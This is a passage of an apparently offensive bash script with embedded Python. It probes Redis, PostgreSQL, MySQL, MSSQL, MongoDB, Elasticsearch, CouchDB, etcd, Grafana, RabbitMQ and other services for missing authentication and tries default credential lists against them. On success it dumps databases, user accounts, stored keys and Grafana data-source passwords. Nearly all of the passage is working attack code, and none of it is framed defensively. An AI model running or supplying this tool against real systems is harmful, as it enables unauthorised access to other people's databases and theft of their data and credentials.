    _redis_cmd $'*3\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n$4\r\nbind\r\n' | grep -v '^\*\|^\$' | head -4 || true
  }
  if printf '%s' "$pong" | grep -q '+PONG'; then
    printf '  %s[!!!] UNAUTHENTICATED — full access%s\n' "${RED}" "${RESET}"
    _redis_dump
  elif printf '%s' "$pong" | grep -qi 'NOAUTH\|noauth'; then
    printf '  %s[~]%s Auth required — trying defaults%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    local found_pw=""
    for pw in '' redis password admin 123456 root default test guest foobared; do
      local resp; resp=$(printf '*2\r\n$4\r\nAUTH\r\n$%d\r\n%s\r\n' "${#pw}" "$pw" \
        | nc -w 3 "$host" 6379 2>/dev/null | head -1) || true
      if printf '%s' "$resp" | grep -q '+OK'; then
        found_pw="$pw"; break
      fi
    done
    if [[ -n "$found_pw" || "$found_pw" == "" && $(printf '*2\r\n$4\r\nAUTH\r\n$0\r\n\r\n' | nc -w 3 "$host" 6379 2>/dev/null | head -1) == *OK* ]]; then
      printf '  %s[+] Password: %s%s%s\n' "${GREEN}" "${BOLD}" "${found_pw:-<blank>}" "${RESET}"
      _redis_dump
    else
      printf '  %s[~]%s No default password worked%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    fi
  else
    printf '  %s[~]%s No response on 6379%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_postgres() {
  local host="$1"
  printf '  %s[*]%s PostgreSQL on %s:5432%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  if check_tool psql; then
    local connected=false u p out
    for creds in 'postgres:' 'postgres:postgres' 'postgres:password' 'postgres:admin' \
                 'postgres:123456' 'admin:admin' 'root:root' 'pgsql:pgsql'; do
      u="${creds%%:*}"; p="${creds##*:}"
      out=$(PGPASSWORD="$p" PGCONNECT_TIMEOUT=4 \
        psql -h "$host" -U "$u" -d postgres -c 'SELECT version();' -t -A 2>/dev/null) || true
      if [[ -n "$out" ]]; then
        printf '  %s[+] Connected — user: %s  pass: %s%s\n' "${GREEN}" "$u" "${p:-<blank>}" "${RESET}"
        printf '%s\n' "$out" | head -3
        printf '  %s[*]%s Databases:\n' "${CYAN}" "${RESET}"
        PGPASSWORD="$p" psql -h "$host" -U "$u" -d postgres -c '\l' -t -A 2>/dev/null | head -20 || true
        printf '  %s[*]%s Users:\n' "${CYAN}" "${RESET}"
        PGPASSWORD="$p" psql -h "$host" -U "$u" -d postgres \
          -c 'SELECT usename,usesuper FROM pg_user;' -t -A 2>/dev/null | head -20 || true
        connected=true; break
      fi
    done
    $connected || printf '  %s[~]%s No default credentials worked%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  else
    printf '  %s[~]%s psql not found — using nmap%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    _db_nmap "$host" 5432 --script pgsql-brute
  fi
}

_act_mysql() {
  local host="$1"
  printf '  %s[*]%s MySQL/MariaDB on %s:3306%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  if check_tool mysql; then
    local connected=false u p out
    for creds in 'root:' 'root:root' 'root:mysql' 'root:password' 'root:admin' \
                 'root:123456' 'admin:admin' 'mysql:mysql' 'root:toor'; do
      u="${creds%%:*}"; p="${creds##*:}"
      out=$(mysql -h "$host" -P 3306 -u "$u" --password="$p" \
        --connect-timeout=4 --batch -e 'SHOW DATABASES;' 2>/dev/null) || true
      if [[ -n "$out" ]]; then
        printf '  %s[+] Connected — user: %s  pass: %s%s\n' "${GREEN}" "$u" "${p:-<blank>}" "${RESET}"
        printf '%s\n' "$out" | head -20
        printf '  %s[*]%s Users:\n' "${CYAN}" "${RESET}"
        mysql -h "$host" -P 3306 -u "$u" --password="$p" --connect-timeout=4 --batch \
          -e "SELECT user,host FROM mysql.user;" 2>/dev/null | head -20 || true
        connected=true; break
      fi
    done
    $connected || printf '  %s[~]%s No default credentials worked%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  else
    printf '  %s[~]%s mysql not found — using nmap%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    _db_nmap "$host" 3306 --script mysql-empty-password,mysql-info,mysql-databases,mysql-users
  fi
}

_act_mssql() {
  local host="$1"
  printf '  %s[*]%s MSSQL on %s:1433%s\n' "${CYAN}" "${RESET}" "${RESET}"
  # Banner
  local banner; banner=$(nc -w 3 "$host" 1433 2>/dev/null | strings | head -2) || true
  [[ -n "$banner" ]] && printf '  %s[*]%s Banner: %s%s%s\n' "${CYAN}" "${RESET}" "${DIM}" "$banner" "${RESET}"
  if python3 -c "import pymssql" 2>/dev/null; then
python3 - "$host" << 'PYEOF'
import sys, pymssql
host = sys.argv[1]
creds = [('sa',''),('sa','sa'),('sa','password'),('sa','admin'),
         ('sa','Password1'),('sa','Passw0rd'),('admin','admin')]
GREEN='\033[38;5;47m'; RED='\033[38;5;196m'
YELLOW='\033[38;5;226m'; BOLD='\033[1m'; RESET='\033[0m'
for u, p in creds:
    try:
        conn = pymssql.connect(server=host, port=1433, user=u, password=p, timeout=4)
        cur = conn.cursor()
        cur.execute("SELECT name FROM sys.databases")
        rows = [r[0] for r in cur.fetchall()]
        print(f'  {RED}{BOLD}[+] Connected — user: {u}  pass: {p or "<blank>"}{RESET}')
        print(f'  {GREEN}Databases: {", ".join(rows)}{RESET}')
        cur.execute("SELECT name,type_desc FROM sys.server_principals WHERE type IN ('S','U')")
        print(f'  {GREEN}Logins: {[r[0] for r in cur.fetchall()]}{RESET}')
        conn.close(); break
    except Exception: pass
else:
    print(f'  {YELLOW}[~] No default credentials worked{RESET}')
PYEOF
  else
    printf '  %s[~]%s pymssql not found — using nmap scripts%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    _db_nmap "$host" 1433 \
      --script ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-ntlm-info
  fi
}

_act_mongodb() {
  local host="$1"
  printf '  %s[*]%s MongoDB on %s:27017%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  if check_tool mongosh || check_tool mongo; then
    local _cli; _cli=$(check_tool mongosh && echo mongosh || echo mongo)
    local out; out=$("$_cli" --host "$host" --port 27017 --quiet \
      --eval 'db.adminCommand({listDatabases:1}).databases.forEach(d=>print(d.name))' \
      2>/dev/null) || true
    if [[ -n "$out" ]]; then
      printf '  %s[!!!] NO AUTH — databases:\n' "${RED}"
      printf '%s\n' "$out"
    else
      printf '  %s[~]%s Auth required — trying defaults%s\n' "${YELLOW}" "${RESET}" "${RESET}"
      for creds in 'admin:admin' 'admin:password' 'root:root' 'mongo:mongo'; do
        local u="${creds%%:*}" p="${creds##*:}"
        out=$("$_cli" --host "$host" --port 27017 --quiet \
          -u "$u" -p "$p" --authenticationDatabase admin \
          --eval 'db.adminCommand({listDatabases:1}).databases.forEach(d=>print(d.name))' \
          2>/dev/null) || true
        if [[ -n "$out" ]]; then
          printf '  %s[+] Auth: %s:%s\n' "${GREEN}" "$u" "$p"
          printf '%s\n' "$out"; break
        fi
      done
    fi
  else
    printf '  %s[~]%s mongo/mongosh not found — using nmap%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    _db_nmap "$host" 27017 --script mongodb-info,mongodb-databases
  fi
}

_act_elasticsearch() {
  local host="$1"
  printf '  %s[*]%s Elasticsearch on %s:9200%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  local info; info=$(curl -sk --connect-timeout 5 "http://$host:9200/" 2>/dev/null) || true
  if printf '%s' "$info" | grep -qi 'cluster_name\|tagline\|You Know'; then
    printf '  %s[!!!] NO AUTH — cluster info:\n' "${RED}"
    printf '%s\n' "$info" | python3 -m json.tool 2>/dev/null | grep -E 'name|version|cluster' | head -10 || printf '%s\n' "$info" | head -6
    printf '  %s[*]%s Indices:\n' "${CYAN}" "${RESET}"
    curl -sk --connect-timeout 5 "http://$host:9200/_cat/indices?v" 2>/dev/null | head -25 || true
    printf '  %s[*]%s Checking for sensitive index names:\n' "${CYAN}" "${RESET}"
    curl -sk --connect-timeout 5 "http://$host:9200/_cat/indices" 2>/dev/null \
      | grep -iE 'user|pass|cred|auth|admin|key|secret|token|log|dump' | head -10 || printf '  %s[~]%s none found%s\n' "${DIM}" "${RESET}" "${RESET}"
  else
    # Try HTTPS + common creds
    for scheme in https http; do
      for creds in 'elastic:elastic' 'elastic:changeme' 'admin:admin' 'elastic:password'; do
        local u="${creds%%:*}" p="${creds##*:}"
        info=$(curl -sk --connect-timeout 5 -u "${u}:${p}" \
          "${scheme}://$host:9200/" 2>/dev/null) || true
        if printf '%s' "$info" | grep -qi 'cluster_name\|You Know'; then
          printf '  %s[+] Auth: %s:%s (%s)\n' "${GREEN}" "$u" "$p" "$scheme"
          curl -sk --connect-timeout 5 -u "${u}:${p}" \
            "${scheme}://$host:9200/_cat/indices?v" 2>/dev/null | head -20 || true
          break 2
        fi
      done
    done
    printf '  %s[~]%s No access on 9200%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_couchdb() {
  local host="$1"
  printf '  %s[*]%s CouchDB on %s:5984%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  local info; info=$(curl -sk --connect-timeout 5 "http://$host:5984/" 2>/dev/null) || true
  if printf '%s' "$info" | grep -qi 'couchdb\|Welcome'; then
    local dbs; dbs=$(curl -sk --connect-timeout 5 "http://$host:5984/_all_dbs" 2>/dev/null) || true
    if printf '%s' "$dbs" | grep -q '\['; then
      printf '  %s[!!!] NO AUTH — databases: %s%s\n' "${RED}" "$dbs" "${RESET}"
      for db in $(printf '%s' "$dbs" | tr -d '[]"' | tr ',' ' '); do
        [[ "$db" == _* ]] && continue
        printf '  %s[*]%s Dumping %s (first 5 docs):\n' "${CYAN}" "${RESET}" "$db"
        curl -sk --connect-timeout 5 \
          "http://$host:5984/$db/_all_docs?include_docs=true&limit=5" 2>/dev/null \
          | python3 -m json.tool 2>/dev/null | head -30 || true
      done
    else
      for creds in 'admin:admin' 'admin:password' 'admin:couchdb' 'root:root' 'couch:couch'; do
        local u="${creds%%:*}" p="${creds##*:}"
        dbs=$(curl -sk --connect-timeout 5 -u "${u}:${p}" \
          "http://$host:5984/_all_dbs" 2>/dev/null) || true
        if printf '%s' "$dbs" | grep -q '\['; then
          printf '  %s[+] Auth: %s:%s — databases: %s%s\n' "${GREEN}" "$u" "$p" "$dbs" "${RESET}"
          break
        fi
      done
      printf '%s' "$dbs" | grep -q '\[' || printf '  %s[~]%s No access%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    fi
  else
    printf '  %s[~]%s No CouchDB response on 5984%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_cassandra() {
  local host="$1"
  printf '  %s[*]%s Cassandra on %s:9042%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  if check_tool cqlsh; then
    local out; out=$(cqlsh "$host" 9042 --connect-timeout=5 -e "DESCRIBE KEYSPACES;" 2>/dev/null) || true
    if [[ -n "$out" ]]; then
      printf '  %s[!!!] NO AUTH — keyspaces:\n' "${RED}"
      printf '%s\n' "$out"
    else
      for creds in 'cassandra:cassandra' 'admin:admin' 'cassandra:password'; do
        local u="${creds%%:*}" p="${creds##*:}"
        out=$(cqlsh "$host" 9042 -u "$u" -p "$p" --connect-timeout=5 \
          -e "DESCRIBE KEYSPACES;" 2>/dev/null) || true
        if [[ -n "$out" ]]; then
          printf '  %s[+] Auth: %s:%s\n' "${GREEN}" "$u" "$p"
          printf '%s\n' "$out"; break
        fi
      done
      [[ -z "$out" ]] && printf '  %s[~]%s Auth required, defaults failed%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    fi
  else
    printf '  %s[~]%s cqlsh not found — using nmap%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    _db_nmap "$host" 9042 --script cassandra-info
  fi
}

_act_influxdb() {
  local host="$1"
  printf '  %s[*]%s InfluxDB on %s:8086%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  local http_code; http_code=$(curl -sk --connect-timeout 5 -o /dev/null \
    -w '%{http_code}' "http://$host:8086/ping" 2>/dev/null) || http_code=0
  if [[ "$http_code" == "204" || "$http_code" == "200" ]]; then
    printf '  %s[+]%s InfluxDB responding (HTTP %s)%s\n' "${GREEN}" "${RESET}" "$http_code" "${RESET}"
    # v1: try no-auth query
    local dbs; dbs=$(curl -sk --connect-timeout 5 \
      "http://$host:8086/query?q=SHOW+DATABASES" 2>/dev/null) || true
    if printf '%s' "$dbs" | grep -q '"results"'; then
      printf '  %s[!!!] NO AUTH (v1):\n' "${RED}"
      printf '%s\n' "$dbs" | python3 -m json.tool 2>/dev/null | head -20 || printf '%s\n' "$dbs" | head -10
    else
      # Try v1 with creds
      for creds in 'admin:admin' 'admin:password' 'root:root' 'influxdb:influxdb'; do
        local u="${creds%%:*}" p="${creds##*:}"
        dbs=$(curl -sk --connect-timeout 5 \
          "http://$host:8086/query?u=${u}&p=${p}&q=SHOW+DATABASES" 2>/dev/null) || true
        if printf '%s' "$dbs" | grep -q '"results"'; then
          printf '  %s[+] Auth (v1): %s:%s\n' "${GREEN}" "$u" "$p"
          printf '%s\n' "$dbs" | python3 -m json.tool 2>/dev/null | head -20 || true
          break
        fi
      done
      # Try v2 API (token-based)
      local health; health=$(curl -sk --connect-timeout 5 \
        "http://$host:8086/health" 2>/dev/null) || true
      printf '%s' "$health" | grep -qi 'pass\|ready' && \
        printf '  %s[*]%s InfluxDB v2 detected — try default token in UI at http://%s:8086%s\n' \
          "${CYAN}" "${RESET}" "$host" "${RESET}"
    fi
  else
    printf '  %s[~]%s No response on 8086%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_neo4j() {
  local host="$1"
  printf '  %s[*]%s Neo4j on %s:7474%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  local info; info=$(curl -sk --connect-timeout 5 "http://$host:7474/" 2>/dev/null) || true
  if printf '%s' "$info" | grep -qi 'neo4j\|bolt\|data\|graph'; then
    local _cypher='{"statements":[{"statement":"MATCH (n) RETURN labels(n) as label, count(n) as cnt ORDER BY cnt DESC LIMIT 10"}]}'
    local out connected=false
    # No-auth attempt
    out=$(curl -sk --connect-timeout 5 \
      -H "Content-Type: application/json" -d "$_cypher" \
      "http://$host:7474/db/data/transaction/commit" 2>/dev/null) || true
    if printf '%s' "$out" | grep -qi '"results"'; then
      printf '  %s[!!!] NO AUTH — node stats:\n' "${RED}"
      printf '%s\n' "$out" | python3 -m json.tool 2>/dev/null | grep '"row"\|"label"\|"cnt"' | head -20 || printf '%s\n' "$out" | head -10
      connected=true
    else
      for creds in 'neo4j:neo4j' 'neo4j:password' 'neo4j:admin' 'admin:admin'; do
        local u="${creds%%:*}" p="${creds##*:}"
        out=$(curl -sk --connect-timeout 5 -u "${u}:${p}" \
          -H "Content-Type: application/json" -d "$_cypher" \
          "http://$host:7474/db/data/transaction/commit" 2>/dev/null) || true
        if printf '%s' "$out" | grep -qi '"results"'; then
          printf '  %s[+] Auth: %s:%s\n' "${GREEN}" "$u" "$p"
          printf '%s\n' "$out" | python3 -m json.tool 2>/dev/null | grep '"row"\|"label"\|"cnt"' | head -20 || true
          connected=true; break
        fi
      done
    fi
    $connected || printf '  %s[~]%s No access%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  else
    printf '  %s[~]%s No Neo4j on 7474%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_memcached() {
  local host="$1"
  printf '  %s[*]%s Memcached on %s:11211%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  local stats; stats=$(printf 'stats\r\nquit\r\n' | nc -w 3 "$host" 11211 2>/dev/null) || true
  if printf '%s' "$stats" | grep -qi 'STAT\|version'; then
    printf '  %s[!!!] NO AUTH — Memcached open%s\n' "${RED}" "${RESET}"
    printf '%s\n' "$stats" \
      | grep -E 'STAT version|STAT uptime|STAT curr_items|STAT bytes |STAT limit_maxbytes|STAT cmd_get|STAT cmd_set' \
      | head -10
    # Enumerate cached keys via slab dump
    local slabs; slabs=$(printf 'stats slabs\r\nquit\r\n' | nc -w 3 "$host" 11211 2>/dev/null \
      | grep '^STAT [0-9]*:chunk_size' | awk -F'[ :]' '{print $2}' | sort -un | head -5) || true
    if [[ -n "$slabs" ]]; then
      printf '  %s[*]%s Cached keys (first slab):\n' "${CYAN}" "${RESET}"
      local s; s=$(printf '%s' "$slabs" | head -1)
      printf 'stats cachedump %s 20\r\nquit\r\n' "$s" \
        | nc -w 3 "$host" 11211 2>/dev/null | grep '^ITEM' | head -20 || true
    fi
  else
    printf '  %s[~]%s No response on 11211%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_rabbitmq() {
  local host="$1"
  printf '  %s[*]%s RabbitMQ management on %s:15672%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  local connected=false
  for creds in 'guest:guest' 'admin:admin' 'rabbitmq:rabbitmq' 'admin:password'; do
    local u="${creds%%:*}" p="${creds##*:}"
    local out; out=$(curl -sk --connect-timeout 5 -u "${u}:${p}" \
      "http://$host:15672/api/overview" 2>/dev/null) || true
    if printf '%s' "$out" | grep -qi 'rabbitmq_version\|management_version'; then
      printf '  %s[+] Auth: %s:%s\n' "${GREEN}" "$u" "$p"
      printf '%s\n' "$out" | python3 -m json.tool 2>/dev/null \
        | grep -E 'rabbitmq_version|erlang_version|node|message_stats' | head -8 || true
      printf '  %s[*]%s Vhosts:\n' "${CYAN}" "${RESET}"
      curl -sk --connect-timeout 5 -u "${u}:${p}" "http://$host:15672/api/vhosts" 2>/dev/null \
        | python3 -m json.tool 2>/dev/null | grep '"name"' | head -10 || true
      printf '  %s[*]%s Queues:\n' "${CYAN}" "${RESET}"
      curl -sk --connect-timeout 5 -u "${u}:${p}" "http://$host:15672/api/queues" 2>/dev/null \
        | python3 -m json.tool 2>/dev/null | grep '"name"\|"messages"' | head -20 || true
      printf '  %s[*]%s Users:\n' "${CYAN}" "${RESET}"
      curl -sk --connect-timeout 5 -u "${u}:${p}" "http://$host:15672/api/users" 2>/dev/null \
        | python3 -m json.tool 2>/dev/null | grep '"name"\|"tags"' | head -10 || true
      connected=true; break
    fi
  done
  $connected || printf '  %s[~]%s No default credentials worked on 15672%s\n' "${YELLOW}" "${RESET}" "${RESET}"
}

_act_etcd() {
  local host="$1"
  printf '  %s[*]%s etcd on %s:2379%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  local health; health=$(curl -sk --connect-timeout 5 "http://$host:2379/health" 2>/dev/null) || true
  if printf '%s' "$health" | grep -qi 'health\|true'; then
    printf '  %s[!!!] NO AUTH — etcd accessible%s\n' "${RED}" "${RESET}"
    printf '%s\n' "$health"
    printf '  %s[*]%s All keys (v3 API, base64 decoded):\n' "${CYAN}" "${RESET}"
    curl -sk --connect-timeout 5 -X POST \
      -H "Content-Type: application/json" \
      -d '{"key":"AA==","range_end":"AA==","limit":50}' \
      "http://$host:2379/v3/kv/range" 2>/dev/null \
      | python3 -c "
import sys, json, base64
try:
    d = json.load(sys.stdin)
    for kv in d.get('kvs', []):
        k = base64.b64decode(kv.get('key','')).decode('utf-8','replace')
        v = base64.b64decode(kv.get('value','')).decode('utf-8','replace')
        print(f'  KEY: {k}')
        print(f'  VAL: {v[:300]}')
        print()
except Exception as e:
    print(f'  [err] {e}')
" 2>/dev/null || true
    printf '  %s[*]%s Keys (v2 API):\n' "${CYAN}" "${RESET}"
    curl -sk --connect-timeout 5 "http://$host:2379/v2/keys/?recursive=true" 2>/dev/null \
      | python3 -m json.tool 2>/dev/null | grep '"key"\|"value"' | head -30 || true
  else
    printf '  %s[~]%s No etcd on 2379%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_grafana() {
  local host="$1"
  printf '  %s[*]%s Grafana on %s:3000%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  local connected=false
  for creds in 'admin:admin' 'admin:password' 'admin:grafana' 'admin:123456'; do
    local u="${creds%%:*}" p="${creds##*:}"
    local out; out=$(curl -sk --connect-timeout 5 -u "${u}:${p}" \
      "http://$host:3000/api/org" 2>/dev/null) || true
    if printf '%s' "$out" | grep -qi '"id"\|"name"'; then
      printf '  %s[+] Auth: %s:%s\n' "${GREEN}" "$u" "$p"
      printf '  %s[*]%s Data sources (may contain DB passwords!):\n' "${CYAN}" "${RESET}"
      curl -sk --connect-timeout 5 -u "${u}:${p}" \
        "http://$host:3000/api/datasources" 2>/dev/null \
        | python3 -m json.tool 2>/dev/null \
        | grep -E '"name"|"type"|"url"|"user"|"password"|"database"' | head -30 || true
      printf '  %s[*]%s Dashboards:\n' "${CYAN}" "${RESET}"
      curl -sk --connect-timeout 5 -u "${u}:${p}" \
        "http://$host:3000/api/search?type=dash-db" 2>/dev/null \
        | python3 -m json.tool 2>/dev/null | grep '"title"\|"url"' | head -15 || true
      printf '  %s[*]%s Users:\n' "${CYAN}" "${RESET}"
      curl -sk --connect-timeout 5 -u "${u}:${p}" \
        "http://$host:3000/api/org/users" 2>/dev/null \
        | python3 -m json.tool 2>/dev/null | grep '"login"\|"email"\|"role"' | head -15 || true
      connected=true; break
    fi
  done
  $connected || printf '  %s[~]%s No Grafana access on 3000%s\n' "${YELLOW}" "${RESET}" "${RESET}"
}

_act_kibana() {
  local host="$1"
  printf '  %s[*]%s Kibana on %s:5601%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  local info; info=$(curl -sk --connect-timeout 5 \
    "http://$host:5601/api/status" 2>/dev/null) || true
  if printf '%s' "$info" | grep -qi 'kibana\|version\|status'; then
    local ver; ver=$(printf '%s' "$info" \
      | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('version',{}).get('number','?'))" 2>/dev/null) || ver="?"
    printf '  %s[!!!] NO AUTH — Kibana %s%s\n' "${RED}" "$ver" "${RESET}"
    printf '  %s[*]%s Index patterns:\n' "${CYAN}" "${RESET}"
    curl -sk --connect-timeout 5 \
      "http://$host:5601/api/saved_objects/_find?type=index-pattern&per_page=20" 2>/dev/null \
      | python3 -m json.tool 2>/dev/null | grep '"title"' | head -15 || true
    printf '  %s[*]%s Dashboards:\n' "${CYAN}" "${RESET}"
    curl -sk --connect-timeout 5 \
      "http://$host:5601/api/saved_objects/_find?type=dashboard&per_page=10" 2>/dev/null \
      | python3 -m json.tool 2>/dev/null | grep '"title"' | head -10 || true
  else
    local connected=false
    for creds in 'elastic:changeme' 'elastic:elastic' 'kibana:changeme' 'admin:admin'; do
      local u="${creds%%:*}" p="${creds##*:}"
      info=$(curl -sk --connect-timeout 5 -u "${u}:${p}" \
        "http://$host:5601/api/status" 2>/dev/null) || true
      if printf '%s' "$info" | grep -qi 'kibana\|version'; then
        printf '  %s[+] Auth: %s:%s\n' "${GREEN}" "$u" "$p"; connected=true; break
      fi
    done
    $connected || printf '  %s[~]%s No Kibana on 5601%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_clickhouse() {
  local host="$1"
  printf '  %s[*]%s ClickHouse on %s:8123%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  local out; out=$(curl -sk --connect-timeout 5 \
    "http://$host:8123/?query=SELECT+version()" 2>/dev/null) || true
  if [[ -n "$out" ]] && ! printf '%s' "$out" | grep -qi 'Authentication\|Unauthorized\|Code: 516'; then
    printf '  %s[!!!] NO AUTH — version: %s%s\n' "${RED}" "$out" "${RESET}"
    printf '  %s[*]%s Databases:\n' "${CYAN}" "${RESET}"
    curl -sk --connect-timeout 5 "http://$host:8123/?query=SHOW+DATABASES" 2>/dev/null | head -20 || true
    printf '  %s[*]%s Users:\n' "${CYAN}" "${RESET}"
    curl -sk --connect-timeout 5 \
      "http://$host:8123/?query=SELECT+name,host_ip,host_names_regexp+FROM+system.users" \
      2>/dev/null | head -10 || true
  else
    local connected=false
    for creds in 'default:' 'default:default' 'default:password' 'admin:admin' 'clickhouse:clickhouse'; do
      local u="${creds%%:*}" p="${creds##*:}"
      out=$(curl -sk --connect-timeout 5 \
        "http://$host:8123/?user=${u}&password=${p}&query=SELECT+version()" 2>/dev/null) || true
      if [[ -n "$out" ]] && ! printf '%s' "$out" | grep -qi 'Authentication\|Code: 516'; then
        printf '  %s[+] Auth: %s:%s — version: %s%s\n' "${GREEN}" "$u" "${p:-<blank>}" "$out" "${RESET}"
        curl -sk --connect-timeout 5 \
          "http://$host:8123/?user=${u}&password=${p}&query=SHOW+DATABASES" 2>/dev/null | head -20 || true
        connected=true; break
      fi
    done
    $connected || printf '  %s[~]%s No ClickHouse access on 8123%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_arangodb() {
  local host="$1"
  printf '  %s[*]%s ArangoDB on %s:8529%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  local connected=false
  for creds in 'root:' 'root:root' 'root:password' 'admin:admin'; do
    local u="${creds%%:*}" p="${creds##*:}"
    local out; out=$(curl -sk --connect-timeout 5 -u "${u}:${p}" \
      "http://$host:8529/_api/database" 2>/dev/null) || true
    if printf '%s' "$out" | grep -qi '"result"\|"_system"'; then
      printf '  %s[+] Auth: %s:%s\n' "${GREEN}" "$u" "${p:-<blank>}"
      printf '%s\n' "$out" | python3 -m json.tool 2>/dev/null | grep '"' | head -15 || printf '%s\n' "$out" | head -8
      printf '  %s[*]%s Collections:\n' "${CYAN}" "${RESET}"
      curl -sk --connect-timeout 5 -u "${u}:${p}" \
        "http://$host:8529/_api/collection" 2>/dev/null \
        | python3 -m json.tool 2>/dev/null | grep '"name"' | grep -v '^  "name": "_' | head -20 || true
      printf '  %s[*]%s Users:\n' "${CYAN}" "${RESET}"
      curl -sk --connect-timeout 5 -u "${u}:${p}" \
        "http://$host:8529/_api/user" 2>/dev/null \
        | python3 -m json.tool 2>/dev/null | grep '"user"' | head -10 || true
      connected=true; break
    fi
  done
  $connected || printf '  %s[~]%s No ArangoDB access on 8529%s\n' "${YELLOW}" "${RESET}" "${RESET}"
}

_act_solr() {
  local host="$1"
  printf '  %s[*]%s Apache Solr on %s:8983%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  local info; info=$(curl -sk --connect-timeout 5 \
    "http://$host:8983/solr/admin/info/system?wt=json" 2>/dev/null) || true
  if printf '%s' "$info" | grep -qi 'solr-spec-version\|lucene\|solr_home'; then
    local ver; ver=$(printf '%s' "$info" \
      | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('lucene',{}).get('solr-spec-version','?'))" 2>/dev/null) || ver="?"
    printf '  %s[!!!] NO AUTH — Solr %s%s\n' "${RED}" "$ver" "${RESET}"
    printf '  %s[*]%s Cores:\n' "${CYAN}" "${RESET}"
    curl -sk --connect-timeout 5 \
      "http://$host:8983/solr/admin/cores?action=STATUS&wt=json" 2>/dev/null \
      | python3 -m json.tool 2>/dev/null | grep '"name"\|"numDocs"\|"sizeInBytes"' | head -20 || true
    printf '  %s[*]%s Collections (SolrCloud):\n' "${CYAN}" "${RESET}"
    curl -sk --connect-timeout 5 \
      "http://$host:8983/solr/admin/collections?action=LIST&wt=json" 2>/dev/null \
      | python3 -m json.tool 2>/dev/null | grep '"' | head -15 || true
  else
    printf '  %s[~]%s No Solr on 8983%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_rethinkdb() {
  local host="$1"
  printf '  %s[*]%s RethinkDB on %s%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  local info; info=$(curl -sk --connect-timeout 5 "http://$host:8080/" 2>/dev/null) || true
  if printf '%s' "$info" | grep -qi 'rethinkdb\|RethinkDB'; then
    printf '  %s[!!!] NO AUTH — RethinkDB admin UI open (http://%s:8080)%s\n' "${RED}" "$host" "${RESET}"
  fi
  # Try driver port 28015
  python3 - "$host" << 'PYEOF'
import sys
host = sys.argv[1]
GREEN='\033[38;5;47m'; RED='\033[38;5;196m'; YELLOW='\033[38;5;226m'
CYAN='\033[38;5;51m'; DIM='\033[2m'; RESET='\033[0m'
try:
    import rethinkdb as r
    conn = r.connect(host=host, port=28015, timeout=5)
    dbs = list(r.db_list().run(conn))
    print(f'  {RED}[!!!] NO AUTH (driver port 28015){RESET}')
    print(f'  {GREEN}Databases: {dbs}{RESET}')
    for db in dbs[:5]:
        try:
            tables = list(r.db(db).table_list().run(conn))
            print(f'  {CYAN}{db}{RESET}: {tables}')
        except Exception: pass
    conn.close()
except ImportError:
    print(f'  {DIM}[~] pip install rethinkdb  for driver access{RESET}')
    print(f'  {DIM}    Admin UI: http://{host}:8080{RESET}')
except Exception as e:
    print(f'  {YELLOW}[~] Driver: {e}{RESET}')
PYEOF
}

_act_orientdb() {
  local host="$1"
  printf '  %s[*]%s OrientDB on %s:2480%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  local connected=false
  for creds in 'root:root' 'admin:admin' 'root:password' 'guest:guest'; do
    local u="${creds%%:*}" p="${creds##*:}"
    local out; out=$(curl -sk --connect-timeout 5 -u "${u}:${p}" \
      "http://$host:2480/listDatabases" 2>/dev/null) || true
    if printf '%s' "$out" | grep -qi '"databases"\|\['; then
      printf '  %s[+] Auth: %s:%s\n' "${GREEN}" "$u" "$p"
      printf '%s\n' "$out" | python3 -m json.tool 2>/dev/null | head -15 || printf '%s\n' "$out" | head -8
      connected=true; break
    fi
  done
  $connected || printf '  %s[~]%s No OrientDB access on 2480%s\n' "${YELLOW}" "${RESET}" "${RESET}"
}

_act_oracle() {
  local host="$1"
  printf '  %s[*]%s Oracle DB on %s:1521%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  local banner; banner=$(nc -w 3 "$host" 1521 2>/dev/null | strings | head -2) || true
  [[ -n "$banner" ]] && printf '  %s[*]%s Banner: %s%s%s\n' "${CYAN}" "${RESET}" "${DIM}" "$banner" "${RESET}"
  if check_tool sqlplus; then
    local connected=false
